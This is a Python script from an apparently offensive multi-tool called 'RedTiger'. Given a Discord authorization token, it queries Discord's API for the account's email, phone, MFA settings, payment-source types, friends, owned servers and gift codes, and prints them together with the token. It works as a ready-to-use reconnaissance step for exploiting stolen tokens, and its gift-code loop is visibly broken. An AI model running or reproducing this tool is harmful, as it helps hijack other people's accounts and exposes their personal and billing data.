# Copyright (c) RedTiger 
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import requests
    from datetime import datetime, timezone
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token Info")

try:
    Slow(discord_banner)
    token_discord = Choice1TokenDiscord()
    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Information Recovery..{reset}")
    try:
        api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()

        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord, 'Content-Type': 'application/json'})

        if response.status_code == 200: status = "Valid"
        else: status = "Invalid"

        username_discord = api.get('username', "None") + '#' + api.get('discriminator', "None")
        display_name_discord = api.get('global_name', "None")
        user_id_discord = api.get('id', "None")
        email_discord = api.get('email', "None")
        email_verified_discord = api.get('verified', "None")
        phone_discord = api.get('phone', "None")
        mfa_discord = api.get('mfa_enabled', "None")
        country_discord = api.get('locale', "None")
        avatar_discord = api.get('avatar', "None")
        avatar_decoration_discord = api.get('avatar_decoration_data', "None")
        public_flags_discord = api.get('public_flags', "None")
        flags_discord = api.get('flags', "None")
        banner_discord = api.get('banner', "None")
        banner_color_discord = api.get('banner_color', "None")
        accent_color_discord = api.get("accent_color", "None")
        nsfw_discord = api.get('nsfw_allowed', "None")

        try: created_at_discord = datetime.fromtimestamp(((int(api.get('id', 'None')) >> 22) + 1420070400000) / 1000, timezone.utc)
        except: created_at_discord = "None"

        try:
            if api.get('premium_type', 'None') == 0:
                nitro_discord = 'False'
            elif api.get('premium_type', 'None') == 1:
                nitro_discord = 'Nitro Classic'
            elif api.get('premium_type', 'None') == 2:
                nitro_discord = 'Nitro Boosts'
            elif api.get('premium_type', 'None') == 3:
                nitro_discord = 'Nitro Basic'
            else:
                nitro_discord = 'False'
        except:
            nitro_discord = "None"

        try: avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{api['avatar']}.png"
        except: avatar_url_discord = "None"
        
        try:
            linked_users_discord = api.get('linked_users', 'None')
            linked_users_discord = ' / '.join(linked_users_discord)
            if not linked_users_discord.strip():
                linked_users_discord = "None"
        except:
            linked_users_discord = "None"
        
        try:
            bio_discord = "\n" + api.get('bio', 'None')
            if not bio_discord.strip() or bio_discord.isspace():
                bio_discord = "None"
        except:
            bio_discord = "None"
        
        try:
            authenticator_types_discord = api.get('authenticator_types', 'None')
            authenticator_types_discord = ' / '.join(authenticator_types_discord)
        except:
            authenticator_types_discord = "None"

        try:
            guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord})
            if guilds_response.status_code == 200:
                guilds = guilds_response.json()
                try:
                    guild_count = len(guilds)
                except:
                    guild_count = "None"
                try:
                    owner_guilds = [guild for guild in guilds if guild['owner']]
                    owner_guild_count = f"({len(owner_guilds)})"
                    owner_guilds_names = [] 
                    if owner_guilds:
                        for guild in owner_guilds:
                            owner_guilds_names.append(f"{guild['name']} ({guild['id']})")
                        owner_guilds_names = "\n" + "\n".join(owner_guilds_names)
                except:
                    owner_guild_count = "None"
                    owner_guilds_names = "None" 
        except:
            owner_guild_count = "None"
            guild_count = "None"
            owner_guilds_names = "None"


        try:
            billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
            if billing_discord:
                payment_methods_discord = []

                for method in billing_discord:
                    if method['type'] == 1:
                        payment_methods_discord.append('CB')
                    elif method['type'] == 2:
                        payment_methods_discord.append("Paypal")
                    else:
                        payment_methods_discord.append('Other')
                payment_methods_discord = ' / '.join(payment_methods_discord)
            else:
                payment_methods_discord = "None"
        except:
            payment_methods_discord = "None"
        
        try:
            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token_discord}).json()
            if friends:
                friends_discord = []
                for friend in friends:
                    unprefered_flags = [64, 128, 256, 1048704]
                    data = f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})"

                    if len('\n'.join(friends_discord)) + len(data) >= 1024:
                        break

                    friends_discord.append(data)

                if len(friends_discord) > 0:
                    friends_discord = '\n' + ' / '.join(friends_discord)
                else:
                    friends_discord = "None"
            else:
                friends_discord = "None"
        except:
            friends_discord = "None"

        try:
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
            if gift_codes:
                codes = []
                for gift_codes_discord in gift_codes:
                    name = gift_codes_discord['promotion']['outbound_title']
                    gift_codes_discord = gift_codes_discord['code']
                    data = f"Gift: {name}\nCode: {gift_codes_discord}"
                    if len('\n\n'.join(gift_codes_discord)) + len(data) >= 1024:
                        break
                    gift_codes_discord.append(data)
                if len(gift_codes_discord) > 0:
                    gift_codes_discord = '\n\n'.join(gift_codes_discord)
                else:
                    gift_codes_discord = "None"
            else:
                gift_codes_discord = "None"
        except:
            gift_codes_discord = "None"

    except Exception as e:
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error when retrieving information: {white}{e}")

    Slow(f"""
{white}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 {INFO_ADD} Status       : {white}{status}{red}
 {INFO_ADD} Token        : {white}{token_discord}{red}
 {INFO_ADD} Username     : {white}{username_discord}{red}
 {INFO_ADD} Display Name : {white}{display_name_discord}{red}
 {INFO_ADD} Id           : {white}{user_id_discord}{red}
 {INFO_ADD} Created      : {white}{created_at_discord}{red}
 {INFO_ADD} Country      : {white}{country_discord}{red}
 {INFO_ADD} Email        : {white}{email_discord}{red}
 {INFO_ADD} Verified     : {white}{email_verified_discord}{red}
 {INFO_ADD} Phone        : {white}{phone_discord}{red}
 {INFO_ADD} Nitro        : {white}{nitro_discord}{red}
 {INFO_ADD} Linked Users : {white}{linked_users_discord}{red}
 {INFO_ADD} Avatar Decor : {white}{avatar_decoration_discord}{red}
 {INFO_ADD} Avatar       : {white}{avatar_discord}{red}
 {INFO_ADD} Avatar URL   : {white}{avatar_url_discord}{red}
 {INFO_ADD} Accent Color : {white}{accent_color_discord}{red}
 {INFO_ADD} Banner       : {white}{banner_discord}{red}
 {INFO_ADD} Banner Color : {white}{banner_color_discord}{red}
 {INFO_ADD} Flags        : {white}{flags_discord}{red}
 {INFO_ADD} Public Flags : {white}{public_flags_discord}{red}
 {INFO_ADD} NSFW         : {white}{nsfw_discord}{red}
 {INFO_ADD} Multi-Factor Authentication : {white}{mfa_discord}{red}
 {INFO_ADD} Authenticator Type          : {white}{authenticator_types_discord}{red}
 {INFO_ADD} Billing      : {white}{payment_methods_discord}{red}
 {INFO_ADD} Gift Code    : {white}{gift_codes_discord}{red}
 {INFO_ADD} Guilds       : {white}{guild_count}{red}
 {INFO_ADD} Owner Guilds : {white}{owner_guild_count}{owner_guilds_names}{red}
 {INFO_ADD} Bio          : {white}{bio_discord}{red}
 {INFO_ADD} Friend       : {white}{friends_discord}{red}
{white}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    """)
    Continue()
    Reset()
except Exception as e:
    Error(e)